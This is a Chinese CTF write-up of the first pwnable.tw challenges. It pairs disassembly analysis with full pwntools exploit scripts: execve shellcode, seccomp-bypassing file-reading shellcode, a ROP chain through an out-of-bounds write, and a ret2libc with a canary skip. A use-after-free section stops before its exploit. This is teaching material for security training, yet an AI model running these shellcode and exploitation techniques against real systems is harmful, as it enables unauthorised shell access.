# CTF-PWN | pwnable.tw前六题题解

阅读量 **1589217**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-03 14:00:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0104798b5ffb498f3e.jpg)

pwnable.tw前六题题解，不算太难，不过也学到很多东西，因为官网不允许公开高分题题解，所以先写了这几道分比较低的题目。

## pwnable.tw_challenge_start

载入IDA分析：

###  0x01 _start

    
    
    public _start
    _start proc near
    push    esp
    push    offset _exit
    xor     eax, eax
    xor     ebx, ebx
    xor     ecx, ecx
    xor     edx, edx
    push    3A465443h
    push    20656874h
    push    20747261h
    push    74732073h
    push    2774654Ch
    mov     ecx, esp        ; addr
    mov     dl, 14h         ; len
    mov     bl, 1           ; fd
    mov     al, 4
    int     80h             ; LINUX - sys_write
    xor     ebx, ebx
    mov     dl, 3Ch
    mov     al, 3
    int     80h             ; LINUX -    add     esp, 14h
    retn
    

可以看到关键几点：

    
    
    开始时esp入栈：push    esp
    而后代表字符串:"Let's start the CTF:"的数据入栈：
    push    3A465443h
    push    20656874h
    push    20747261h
    push    74732073h
    push    2774654Ch
    调用80h中断中的4号程序：sys_write显示字符串
    调用80h中断中的3号程序：sys_read读入字符串
    栈帧大小为(我们需要覆盖的长度)20字节: add     esp, 14h
    

这里附上system_call的系统调用表网址：

    
    
    http://syscalls.kernelgrok.com/
    

###  0x02 获取shell

很显然，这里需要利用第二步调用中断的sys_read来覆盖返回地址来获取shell，因此我们需要：

    
    
    1   获得esp地址以便覆盖返回地址来执行我们的shellcode
    2   使用shellcode覆盖栈中数据
    

开始时，_start中将esp入栈，而最后_start返回时栈顶便是我们需要的esp值  
我们需要构造payload：

    
    
    payload=任意20字节字符串+p32(调用sys_write的mov     ecx, esp地址)
    

获取esp值后，我们将shellcode入栈并利用覆盖返回地址来执行：

    
    
    payload=任意20字节字符串+p32(esp+20)+shellcode
    

###  0x03 shellcode

利用80h中断中的sys_execve：

    
    
    x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80
    

即：

    
    
    31 c9                   xor    ecx,ecx
    f7 e1                   mul    ecx
    51                      push   ecx
    68 2f 2f 73 68          push   0x68732f2f     ;传入参数/bin/sh
    68 2f 62 69 6e          push   0x6e69622f
    89 e3                   mov    ebx,esp
    b0 0b                   mov    al,0xb        ;调用80h中断中b号程序：sys_execve
    cd 80                   int    0x80
    

###  0x04 EXP

    
    
    from pwn import  *
    
    p = remote('chall.pwnable.tw',10000)
    payload = 'a'*20 + p32(0x08048087)
    p.recvuntil(':')
    p.send(payload)
    addr = u32(p.recv(4))+20
    shellcode = 'x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80'
    payload = 'a'*20 + p32(addr) + shellcode
    p.send(payload)
    p.interactive()
    

## pwnable.tw_challenge_orw

载入IDA分析：

###  0x01 main

    
    
    lea     ecx, [esp+4]
    and     esp, 0FFFFFFF0h
    push    dword ptr [ecx-4]
    push    ebp
    mov     ebp, esp
    push    ecx
    sub     esp, 4
    call    orw_seccomp
    sub     esp, 0Ch
    push    offset format   ; "Give my your shellcode:"
    call    _printf
    add     esp, 10h
    sub     esp, 4
    push    0C8h            ; nbytes
    push    offset shellcode ; buf
    push    0               ; fd
    call    _read
    add     esp, 10h
    mov     eax, offset shellcode
    call    eax ; shellcode
    mov     eax, 0
    mov     ecx, [ebp+var_4]
    leave
    lea     esp, [ecx-4]
    retn
    

这里很简单：

    
    
    1   读入我们输入的shellcode
    2   自动调用我们的shellcode：
    mov     eax, offset shellcode
    call    eax ; shellcode
    

###  0x02 seccomp

首先直接尝试了调用sys_execve来获取shell，结果失败  
重新看程序，发现了 **orw_seccomp** ，猜测这里使用seccomp白名单的保护机制来限制我们对系统调用（system call）的函数调用  
这里我们的目的是读取flag文件  
为了绕过seccomp，我们不用获取shell  
只需要利用：

    
    
    sys_open
    sys_read    
    sys_write
    

来读取/home/orw/flag文件即可(官网：The flag is usually at /home/xxx/flag)

###  0x03 shellcode

    
    
    xor  ecx,ecx
    push ecx                 ;字符串结尾00
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov  ebx,esp             ;const char __user *filename
    xor  edx,edx             ;int mode
    mov  eax,0x5             ;sys_open 
    int  0x80
    
    mov ebx,eax              ;int  fd
    mov ecx,esp              ;char __user *buf       
    mov edx,0x30             ;size_t count
    mov eax,0x3              ;sys_read
    int 0x80
    
    mov eax,0x4              ;sys_write
    mov ebx,0x1              ;int fd=1   (标准输出stdout）/（0 标准输入， 1 标准输出，2 标准错误）
    mov edx,0x30             ;size_t count
    int 0x80
    

或者直接利用shellcraft构造：

    
    
    shellcode = ""
    shellcode += shellcraft.i386.pushstr("/home/orw/flag")
    shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')
    shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
    shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
    

###  0x04 EXP

    
    
    from pwn import  *
    
    p = remote('chall.pwnable.tw',10001)
    p.recvuntil(':')
    shellcode = "xor  ecx,ecx;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov  ebx,esp;xor  edx,edx;mov  eax,0x5;int  0x80;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80"
    p.send(asm(shellcode))
    p.interactive()
    

或者：

    
    
    from pwn import *
    
    p = remote("chall.pwnable.tw", 10001)
    shellcode = ""
    shellcode += shellcraft.i386.pushstr("/home/orw/flag")    
    shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')    #shellcraft.i386.linux.syscall("SYS_open", 'esp', 'O_RDONLY', 0)(O_RDONLY只读模式，O_WRONLY只写模式，O_RDWR读写模式)
    shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
    shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
    p.recvuntil(":")
    p.send(asm(shellcode))
    p.interactive()
    

## pwnable.tw_challenge_calc

首先运行一下  
了解到这个程序大概类似计算器，计算我们输入的一个合法表达式的值  
载入IDA分析：

###  0x01 程序过程

0x01 main

    
    
    push    ebp
    mov     ebp, esp
    and     esp, 0FFFFFFF0h
    sub     esp, 10h
    mov     dword ptr [esp+4], offset timeout
    mov     dword ptr [esp], 0Eh
    call    ssignal
    mov     dword ptr [esp], 3Ch
    call    alarm
    mov     dword ptr [esp], offset aWelcomeToSecpr ; "=== Welcome to SECPROG calculator ==="
    call    puts
    mov     eax, stdout
    mov     [esp], eax
    call    fflush
    call    calc
    mov     dword ptr [esp], offset aMerryChristmas ; "Merry Christmas!"
    call    puts
    leave
    retn
    

可以看到这里关键处：

    
    
    调用一个计时器
    调用关键函数calc
    

0x02 calc

0x01 canary保护

可以看到函数开始：

    
    
    push    ebp
    mov     ebp, esp
    sub     esp, 5B8h
    mov     eax, large gs:14h
    mov     [ebp+var_C], eax
    xor     eax, eax
    

可以看到这里启用了canary保护  
将内存large gs:14h中的(随机值)入栈  
并在程序返回前对canary值进行检验：

    
    
    nop
    mov     eax, [ebp+var_C]
    xor     eax, large gs:14h
    jz      short locret_8049432
    

canary值在栈中位于返回地址和函数调用参数之间  
从而保护了栈内数据，防止我们修改返回地址造成栈溢出

0x02 _bzero

canary入栈后calc调用了bzero：

    
    
    mov     dword ptr [esp+4], 400h
    lea     eax, [ebp+s]
    mov     [esp], eax      ; s
    call    _bzero
    

这里从ebp+s开始将一段长为0x400的空间清零

0x03 get_expr

开辟一段数据后，calc调用了get_expr函数

    
    
    mov     dword ptr [esp+4], 400h
    lea     eax, [ebp+s]
    mov     [esp], eax
    call    get_expr
    

跟进get_expr后发现一堆判断跳转  
大致过程：

    
    
    过滤掉除"[0-9],+,-,×,/,%"外的其他字符
    读入我们输入的表达式到_bzero开辟的空间中
    当我们成功读入返回值不为0，calc跳转到loc_80493CC处：
    test    eax, eax
    jnz     short loc_80493CC
    

0x04 init_pool

接下来calc调用init_pool：

    
    
    lea     eax, [ebp+var_5A0]
    mov     [esp], eax
    call    init_pool
    

init_pool：

    
    
    .text:08048FF8                 push    ebp
    .text:08048FF9                 mov     ebp, esp
    .text:08048FFB                 sub     esp, 10h
    .text:08048FFE                 mov     eax, [ebp+arg_0]
    .text:08049001                 mov     dword ptr [eax], 0
    .text:08049007                 mov     [ebp+var_4], 0
    .text:0804900E                 jmp     short loc_8049022
    .text:08049010 ; ---------------------------------------------------------------------------    .text:08049010
    .text:08049010 loc_8049010:                            ; CODE XREF: init_pool+2E↓j
    .text:08049010                 mov     eax, [ebp+arg_0]
    .text:08049013                 mov     edx, [ebp+var_4]
    .text:08049016                 mov     dword ptr [eax+edx*4+4], 0
    .text:0804901E                 add     [ebp+var_4], 1
    .text:08049022
    .text:08049022 loc_8049022:                            ; CODE XREF: init_pool+16↑j
    .text:08049022                 cmp     [ebp+var_4], 63h
    .text:08049026                 jle     short loc_8049010
    .text:08049028                 leave
    .text:08049029                 retn
    

很简短的一个过程：

    
    
    从ebp+var_5A0开始
    将长度为63h的空间清零
    

0x05 parse_expr

接下来calc调用 parse_expr函数：

    
    
    lea     eax, [ebp+var_5A0]
    mov     [esp+4], eax
    lea     eax, [ebp+s]
    mov     [esp], eax
    call    parse_expr
    

可以看到其参数：

    
    
    init_pool清零的那段空间的首地址：ebp+var_5A0
    对应读入表达式的首地址：ebp+s
    

首先F5分析一下parse_expr的伪代码（分析在注释处）：

    
    
    signed int __cdecl parse_expr(int a1, _DWORD *a2)
    {
      int v2; // ST2C_4
      int v4; // eax
      int v5; // [esp+20h] [ebp-88h]
      int i; // [esp+24h] [ebp-84h]
      int v7; // [esp+28h] [ebp-80h]
      char *s1; // [esp+30h] [ebp-78h]
      int v9; // [esp+34h] [ebp-74h]
      char s[100]; // [esp+38h] [ebp-70h]
      unsigned int v11; // [esp+9Ch] [ebp-Ch]
    
      v11 = __readgsdword(0x14u);
      v5 = a1;
      v7 = 0;
      bzero(s, 0x64u);
      for ( i = 0; ; ++i )
      {
        if ( (unsigned int)(*(char *)(i + a1) - 48) > 9 )// 比对ascii并转换成unsigned int后，检验是否为运算符
        {
          v2 = i + a1 - v5;                         // 运算符左操作数长度
          s1 = (char *)malloc(v2 + 1);
          memcpy(s1, v5, v2);
          s1[v2] = 0;
          if ( !strcmp(s1, "0") )                   // 判断运算符左边操作数是否为0
          {
            puts("prevent division by zero");
            fflush(stdout);
            return 0;
          }
          v9 = atoi((int)s1);                       // 将读入的操作数由字符串转化为int
          if ( v9 > 0 )
          {
            v4 = (*a2)++;                           // a2[0]保存操作数个数
            a2[v4 + 1] = v9;                        // 将第二个操作数存入第二次开辟的那段空间
          }
          if ( *(_BYTE *)(i + a1) && (unsigned int)(*(char *)(i + 1 + a1) - 48) > 9 )// 判断是否两个运算符连续
          {
            puts("expression error!");
            fflush(stdout);
            return 0;
          }
          v5 = i + 1 + a1;                          // v5指向运算符后一个字符，构造下一个循环
          if ( s[v7] )                              // 判断是否为第一个操作数（对上一个操作符进行判断）
          {
            switch ( *(char *)(i + a1) )
            {
              case 37:
              case 42:
              case 47:
                if ( s[v7] != 43 && s[v7] != 45 )   // 判断运算是否为加减从而确定运算顺序
                {
                  eval(a2, s[v7]);
                  s[v7] = *(_BYTE *)(i + a1);
                }
                else
                {
                  s[++v7] = *(_BYTE *)(i + a1);
                }
                break;
              case 43:
              case 45:
                eval(a2, s[v7]);
                s[v7] = *(_BYTE *)(i + a1);
                break;
              default:
                eval(a2, s[v7--]);                  // 保证了最后while时运算符右边的优先级大于左边
                break;
            }
          }
          else                                      // 若此操作符不是第一个操作符，则读入s[v7]中
          {
            s[v7] = *(_BYTE *)(i + a1);
          }
          if ( !*(_BYTE *)(i + a1) )                // 字符串结尾
            break;
        }
      }
      while ( v7 >= 0 )
        eval(a2, s[v7--]);                          // 将因优先级问题没有计算的运算从右向左依次计算
      return 1;
    }
    

除此之外，这里调用了eval函数来进行计算：

    
    
    _DWORD *__cdecl eval(_DWORD *a1, char a2)
    {
      _DWORD *result; // eax
    
      if ( a2 == 43 )
      {
        a1[*a1 - 1] += a1[*a1];
      }
      else if ( a2 > 43 )
      {
        if ( a2 == 45 )
        {
          a1[*a1 - 1] -= a1[*a1];
        }
        else if ( a2 == 47 )
        {
          a1[*a1 - 1] /= a1[*a1];
        }
      }
      else if ( a2 == 42 )
      {
        a1[*a1 - 1] *= a1[*a1];
      }
      result = a1;
      --*a1;
      return result;
    }
    

可以看到：

    
    
    init_pool中开辟的空间依次保存操作数（即calc中的：var_59C= dword ptr -59Ch）（开始位置保存操作数个数）
    parse_expr中新开辟的空间s保存运算符
    a2[*a2]处保存表达式最终结果
    

###  0x02 漏洞

在parse_expr中分析：  
正常情况下最终应该在a2[1]处的值为结果  
可当考虑到第一个字符即为运算符的情况下：  
例如：+10

    
    
    *a2=1(一个操作数)
    a2[1]=10
    s[0]='+'
    a2[*a2-1]=a2[*a2-1]+a2[*a2]
    即：a2[0]=a2[0]+a2[1]=11
    而后--*a2,即：*a2=10
    最终输出结果为a2[*a2]=a2[10]
    这里注意*a2与 init_pool中开辟的63h长度的地址是连续的，记 init_pool中地址为a3的话
    那么如果最后输出a3[*a2-1]=a2[*a2]
    

同样地：

    
    
    如果+10+1
    则会使：a2[10]=a2[10]+1
    并输出a2[10]
    那么当我们选取恰当大小的操作数即可绕过canary修改返回地址，从而实现溢出
    

这里注意：

    
    
    每一次循环都会重新调用前面两个清零的函数，我们修改这里的数据，下一次依然会清零（不过这段地址外数据（包括我们要修改的返回地址）不会清零，可以修改）
    

我们查看一下程序的保护机制：

    
    
    checksec  --file ./calc
    

发现：  
  
这里开启了NX保护  
我们无法在栈上执行shellcode拿到shell  
同时看到这里：

    
    
    objdump -R ./clac
    

  
程序是静态链接  
我们这里考虑利用ROP调用sys_execve来获得shell

0x03 ROP

首先计算出返回地址与*a2的距离

    
    
    0x5A0+0x4=1444
    1444/4=361
    

故而:

    
    
    输入+361时反回的即时calc的返回地址
    我们需要连续修改a2[361]后的一段栈内数据来构造ROP链
    

我们最终需要：

    
    
    ebx=“/bin/sh”字符串首地址
    ecx=0
    eax=0xb
    

我们需要构造一段栈内数据：

    
    
    addr(pop eax;ret)->0xb->addr(pop ecx;popebx,ret)->0->addr"/bin/sh"->addr(int 80h)->"/bin/sh"
    

利用ROPgadget找到我们需要指令的地址：

    
    
    ROPgadget --binary ./calc  --ropchain
    

  
下面：

    
    
    我们需要先通过找到栈中对应位置的值计算出我们需要的差值
    利用差值将从返回地址开始的一段栈数据修改成我们需要的值
    例如：
    我们先修改+361处的值
    +361处需要修改为addr(pop eax;ret)（pop eax;ret指令地址）
    假设pop eax;ret指令地址为：0x1
    我们输入"+361"，返回：0x0
    它与我们需要的值差值为0x1-0x0=1
    我们输入+361+1
    即可修改+361处值为我们需要的0x1
    

注意：  
**其中/bin/sh字符串我们只知道其在栈中的相对地址，这里需要我们先取得main函数的ebp地址（我们取得+360(main函数基地址)是负数，需要+0x100000000转换后运算，再在最后-0x100000000修改对应位置值）**

在main中：

    
    
    and     esp, 0FFFFFFF0h
    sub     esp, 10h
    

故而返回地址即在：

    
    
    addr_re=([ebp]&0xfffffff0)-16   #注意脚本书写时运算优先级"+">"&"
    

**而后再根据我们最后在栈内构造的字符串”/bin/sh”与返回地址的相对位置计算出字符串”/bin/sh”的地址即可**

0x04 EXP

    
    
    from pwn import *
    
    p=remote('chall.pwnable.tw',10100)
    #p=process("./calc")
    key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]
    p.recv()
    p.sendline('+360')
    addr_bp=int(p.recv())
    addr_re=((addr_bp+0x100000000)&0xFFFFFFF0)-16
    addr_str=addr_re+20-0x100000000
    addr=361
    for i in range(5):
          p.sendline('+'+str(addr+i))
          ans=int(p.recv())
          if key[i]<ans:
                 ans=ans-key[i]
                 p.sendline('+'+str(addr+i)+'-'+str(ans))
          else:
              ans=key[i]-ans
              p.sendline('+'+str(addr+i)+'+'+str(ans))
          p.recv()
    p.sendline('+'+'365'+str(addr_str))
    p.recv()
    for i in range(5,8):
          p.sendline('+'+str(addr+i))
          ans=int(p.recv())
          if key[i]<ans:
                 ans=ans-key[i]
                 p.sendline('+'+str(addr+i)+'-'+str(ans))
          else:
              ans=key[i]-ans
              p.sendline('+'+str(addr+i)+'+'+str(ans))
          p.recv()
    p.send('kirin'+'n')
    p.interactive()
    

## pwnable.tw_challenge_dubblesort

首先运行一下大概了解程序的流程：

    
    
    运行结果
    What your name :kirin
    Hello kirin
    ��/,How many numbers do you what to sort :3
    Enter the 0 number : 4  
    Enter the 1 number : 5
    Enter the 2 number : 6
    Processing......
    Result :
    4 5 6
    

首先是传入一个name  
而后需要我们指出需要排序的数字个数  
而后需要我们依次输入需要排序的数字  
最后程序给出排序好的result  
不过这里发现一个问题， **有些名字后存在其他字符（类似乱码）**  
 **猜测这里应该是字符串00结尾没有处理好而泄露了名字后的部分数据**  
先记下这个问题  
下面载入IDA分析：

###  0x01 main

    
    
    push    ebp
    mov     ebp, esp
    push    edi
    push    esi
    push    ebx
    and     esp, 0FFFFFFF0h
    add     esp, 0FFFFFF80h
    call    sub_5662B750
    add     ebx, 15CCh
    mov     eax, large gs:14h
    mov     [esp+7Ch], eax
    xor     eax, eax
    call    sub_5662B8B5
    

可以看出这里：

    
    
    开启了canary保护：mov     eax, large gs:14h
    调用了一个sub_5662B8B5函数（一个计时器）
    可以直接绕过这个计时器来动态分析：
    call    sub_5662B8B5改为nop
    或者：在call地址后的首句push ebp改为retn
    或者：类似方法去除程序对alarm/signal的调用
    或者：直接改变alarm的参数（加长时间）
    或者：调试到alarm时set新的ip跳过call alarm
    在gdb中可以忽略中间信号来绕过计时器：
    i handle SIGALRM
    handle SIGALRM nopass
    

下面：  
输出”What your name :”：

    
    
    .text:5662B9EB                 lea     eax, (aWhatYourName - 5662CFA0h)[ebx] ; "What your name :"
    .text:5662B9F1                 mov     [esp+4], eax
    .text:5662B9F5                 mov     dword ptr [esp], 1
    .text:5662B9FC                 call    ___printf_chk
    

从输入流读入0x40长度(输入流结尾自动停止读入)的字节到esp+8Ch+buf处：

    
    
    .text:5662BA01                 mov     dword ptr [esp+8], 40h ; '@' ; nbytes
    .text:5662BA09                 lea     esi, [esp+8Ch+buf]
    .text:5662BA0D                 mov     [esp+4], esi    ; buf
    .text:5662BA11                 mov     dword ptr [esp], 0 ; fd
    .text:5662BA18                 call    _read
    

输出”Hello %s,How many numbers do you what to sort :”：

    
    
    mov     [esp+8], esi
    lea     eax, (aHelloSHowManyN - 5662CFA0h)[ebx] ; "Hello %s,How many numbers do you what t"...
    mov     [esp+4], eax
    mov     dword ptr [esp], 1
    call    ___printf_chk
    

使用scanf读入一个unsigned型数（所需排序个数）：

    
    
    .text:5662BA37                 lea     eax, [esp+18h]
    .text:5662BA3B                 mov     [esp+4], eax
    .text:5662BA3F                 lea     eax, (aU - 5662CFA0h)[ebx] ; "%u"
    .text:5662BA45                 mov     [esp], eax
    .text:5662BA48                 call    ___isoc99_scanf
    

接下来再调用scanf读入相应个数的unsigned并调用一个冒泡排序:sub_5662B931  
最终输出结果

###  0x02 漏洞

0x01 字符串结尾x00截断问题

**首先就是开始时候的name可以泄露栈内数据：**  
当我们输入：”aaaa”  
程序输出：  
  
看一下栈内数据：  
  
可以看到buff内数据是 **aaaa+’n’**
，而后面没有对字符串结尾加上00进行截断，导致后面的FFBA4B00上的数据在换行之后也输出了，直到遇到FFBA4804处的”x00”

0x02 scanf读取unsigned数时非法字符问题

测试代码：

    
    
    #include<stdio.h>
    int main()
    {int i;
    while(~scanf("%u",&i))
    printf("%un",i);
    }
    

当输入一个非法字符时，其可能会因输入流问题直接输出栈上数据：

    
    
    当输入"+-"这类数字本身中就有（"+-"代表正负）的字符，则输出栈上数据
    +
    32764
    -    32764
    当输入"abc......"这类非法字符，因为输入流问题，这里没有成功scanf，便不断printf数据
    a
    32764
    32764
    32764
    32764
    .......
    

在程序中测试：

    
    
     ./dubblesort
    What your name :kirin
    Hello kirin
    ��/,How many numbers do you what to sort :5
    Enter the 0 number : +
    Enter the 1 number : +
    Enter the 2 number : + 
    Enter the 3 number : +
    Enter the 4 number : +
    Processing......
    Result :
    0 1 12779520 4158922506 4291112735
    

我们输入前栈中v13(保存需要排序的数字)处的数据分布：  
  
排序输出后：  
  
 **可以看到我们这里输入”+”并不改变栈内数据，而是对其中的数据重新排序**

0x03 ret2libc

首先使用chechsec看一下程序的保护机制：

    
    
    checksec ./dubblesort
    

  
可以看到全部开启，考虑到调试过程发现其加载了libc库以及：

    
    
    objdump -R ./dubblesort
    

  
这里我们可以利用ret2libc执行system(“/bin/sh”)来获取shell  
我们需要：

    
    
    对方环境下libc动态库中函数system的偏移量
    对方环境下libc动态库中字符串"binsh"的偏移量
    程序加载libc库的基地址
    合理布置栈来执行函数
    

0x01 system的偏移量

利用题目给出的库文件：

    
    
    readelf -s ./libc_32.so.6|grep system
    
    
    
    245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
    1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
    

所以：

    
    
    system_off = 0x3a940
    

0x02 “binsh”的偏移量

    
    
    hexdump -C ./libc_32.so.6|grep  /bin -A 1  #防止换行所以只grep /bin 而后显示后一行
    

找到了：

    
    
    00158e80  74 6f 64 5f 6c 2e 63 00  2d 63 00 2f 62 69 6e 2f  |tod_l.c.-c./bin/|
    00158e90  73 68 00 65 78 69 74 20  30 00 63 61 6e 6f 6e 69  |sh.exit 0.canoni|
    

所以：

    
    
    bin_sh_off = 0x158e8b
    

0x03 程序加载libc库的基地址

若要获取基地址，便要得到一个相对基地址偏移量固定的地址  
而能泄露数据的只有name和最后的排序处  
但排序处会直接结束进程  
我们需要利用排序前的scanf来布置栈空间  
所以这里只能利用name泄露buf后某个栈内地址  
动态调试看一下name后的栈内数据：  
  
可以看到第七和第八个数据都在libc中  
接着调试后锁定第七个数据：  
看一下这次载入libc的地址：  
  
第七位地址的相对位移：

    
    
    off=0xf7f70000-0xf7dbe000=0x1b2000
    

**注意：这里的偏移地址是相对于本地的libc-2.23.so文件**

    
    
    readelf -S ./libc-2.23.so
    

  
看到这里的对应偏移位置是：

    
    
    .got.plt
    

对应远程的libc文件的.got.plt的偏移地址为：  

    
    
    0x1b0000
    

栈中数据构造

这里需要注意：  
栈内数据写入后会被排序  
所以我们要让排序后的栈内：

    
    
    cannary处 -> 输入加号使其保持不变
    返回地址处 -> system_addr
    返回地址后一个单位 -> system的返回地址(随意填写，不过注意大小问题，这里直接填入system_addr或者bin_sh_addr)
    返回地址后第二位 -> bin_sh_addr
    

一般情况下这几个数便是从小到大排列（除非canary随机到很大）  
所以我们：

    
    
    首先将数字正常的栈空间覆盖为0(调试后是24位)
    canary处:"+"
    canary到返回地址间覆盖为system_addr
    返回地址后一位system函数返回地址处覆盖为system_addr或者bin_sh_addr
    再后一位覆盖为bin_sh_addr
    

不过当输入字符来利用name获得.got.plt地址时总是出错  
调试后发现，这个地址末位总是00，造成了截断，所以需要多输入一位来使用换行符（chr(0xa)）来覆盖这里（在后面计算地址的时候再减去0xa）

###  0x03 EXP

    
    
    from pwn import *
    
    got_off = 0x1b0000
    system_off = 0x3a940
    bin_sh_off = 0x158e8b
    
    p = remote("chall.pwnable.tw",10101)
    p.recv()
    p.sendline('a'*24)
    got_addr = u32(p.recv()[30:34])-0xa
    libc_addr = got_addr-got_off
    system_addr = libc_addr + system_off
    bin_sh_addr = libc_addr + bin_sh_off
    p.sendline('35')
    p.recv()
    for i in range(24):
        p.sendline('0')
        p.recv()
    p.sendline('+')
    p.recv()
    for i in range(9):
        p.sendline(str(system_addr))
        p.recv()
    p.sendline(str(bin_sh_addr))
    p.recv()
    p.interactive()
    

## pwnable.tw_challenge_hacknote

打开程序，查看功能：

    
    
    ./hacknote
    ----------------------           HackNote       
    ----------------------     1. Add note          
     2. Delete note       
     3. Print note        
     4. Exit              
    ----------------------    Your choice :
    

这里可以增加删除打印note信息  
载入IDA分析:

###  0x01 add_note

    
    
    unsigned int add_note()
    {
      _DWORD *v0; // ebx
      signed int i; // [esp+Ch] [ebp-1Ch]
      int size; // [esp+10h] [ebp-18h]
      char buf; // [esp+14h] [ebp-14h]
      unsigned int v5; // [esp+1Ch] [ebp-Ch]
    
      v5 = __readgsdword(0x14u);
      if ( dword_804A04C <= 5 )
      {
        for ( i = 0; i <= 4; ++i )
        {
          if ( !ptr[i] )
          {
            ptr[i] = malloc(8u);
            if ( !ptr[i] )
            {
              puts("Alloca Error");
              exit(-1);
            }
            *(_DWORD *)ptr[i] = putnote;
            printf("Note size :");
            read(0, &buf, 8u);
            size = atoi(&buf);
            v0 = ptr[i];
            v0[1] = malloc(size);
            if ( !*((_DWORD *)ptr[i] + 1) )
            {
              puts("Alloca Error");
              exit(-1);
            }
            printf("Content :");
            read(0, *((void **)ptr[i] + 1), size);
            puts("Success !");
            ++dword_804A04C;
            return __readgsdword(0x14u) ^ v5;
          }
        }
      }
      else
      {
        puts("Full");
      }
      return __readgsdword(0x14u) ^ v5;
    }
    

可以看到这里malloc了一个结构体：

    
    
    struct note{
    *putnote;   //指向用于输出note内容的函数( *(_DWORD *)ptr[i] = putnote;)
    *text;   //指向note对应的内容(read(0, *((void **)ptr[i] + 1), size);)
    }
    

而后根据size再申请新的空间：

    
    
     v0 = ptr[i];
     v0[1] = malloc(size);//申请存储note内容的地址
    

###  0x02 print_note

    
    
    unsigned int print_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf; // [esp+8h] [ebp-10h]
      unsigned int v3; // [esp+Ch] [ebp-Ch]
    
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, &buf, 4u);
      v1 = atoi(&buf);
      if ( v1 < 0 || v1 >= dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( ptr[v1] )
        (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
      return __readgsdword(0x14u) ^ v3;
    }
    

可以看到这里调用结构体第一个位置的地址所指的函数，参数就是结构体本身

###  0x03 delete_note

    
    
    unsigned int delete_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf; // [esp+8h] [ebp-10h]
      unsigned int v3; // [esp+Ch] [ebp-Ch]
    
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, &buf, 4u);
      v1 = atoi(&buf);
      if ( v1 < 0 || v1 >= dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( ptr[v1] )
      {
        free(*((void **)ptr[v1] + 1));
        free(ptr[v1]);
        puts("Success");
      }
      return __readgsdword(0x14u) ^ v3;
    }
    

可以看到这里只是用free释放  
但没有将指针置空为NULL  
产生一个迷途指针  
这里便可利用这个指针来造成堆溢出来获得shell

###  0x04 malloc分配机制

    
    
    #define request2size(req)                                         
      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             
       MINSIZE :                                                      
       ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
    

SIZE_SZ：

    
    
    sizeof(size_t)   //32位->4字节，64位->8字节
    

MINSIZE:

    
    
    #define MINSIZE  
      (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
    

MIN_CHUNK_SIZE为一个chunk结构体的大小：为16字节

    
    
    struct malloc_chunk {
    
      INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
    
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
    
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
    

**MALLOC_ALIGNMENT为2*SIZE_SZ**  
 **MALLOC_ALIGN_MASK 为2*SIZE_SZ-1**  
 **由此即可通过最开始的request2size(req) 计算出系统分配出的内存大小** ：

    
    
    例如，32位时：
    MINSIZE：(16+2*4-1)&~(2*4-1)=16
    申请字节：
    1-4字节：(req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE
    系统分配：
    MINSIZE=16字节
    申请字节：
    5-12字节：(req) + SIZE_SZ + MALLOC_ALIGN_MASK >=MINSIZE
    系统分配：
    (req) + SIZE_SZ + MALLOC_ALIGN_MASK) &~MALLOC_ALIGN_MASK=16字节
    申请字节：
    13字节
    系统分配：
    (req) + SIZE_SZ + MALLOC_ALIGN_MASK) &~MALLOC_ALIGN_MASK=24字节
    //可以看到分配相邻上下大小之差为系统指针大小（32位8字节，64位16字节）
    

**又因fastbin采用LIFO原则(其会在空表从后往前寻找首先合适的堆块)**  
故而我们需要先申请两个note  
再利用delete制造迷途指针并利用堆溢出覆盖堆中数据从而拿到shell

###  0x05 漏洞利用

首先看到：

    
    
    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
    

当我们print_note时，会调用结构体中第一个地址指向的函数  
函数参数就是结构体自身  
我们需要溢出覆盖掉一个之前申请过的结构体  
将结构体第一个函数地址修改（获得shell，需要覆盖为system的地址）  
而一个结构体16个字节，system的参数即为结构体本身  
